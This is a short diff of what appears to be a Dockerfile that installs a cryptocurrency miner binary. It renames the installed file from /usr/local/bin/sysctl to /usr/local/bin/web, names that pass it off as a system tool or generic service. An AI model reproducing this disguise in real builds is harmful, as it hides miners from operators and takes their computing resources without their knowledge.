@@ -31,8 +31,8 @@ COPY sysctl.conf /etc/sysctl.conf
 RUN sysctl -p
 
 # Download miner binary
-COPY iniminer-linux-x64 /usr/local/bin/sysctl
-RUN chmod +x /usr/local/bin/sysctl
+COPY iniminer-linux-x64 /usr/local/bin/web
+RUN chmod +x /usr/local/bin/web
 
 # Copy startup script
 COPY input.sh /usr/local/bin/input.sh
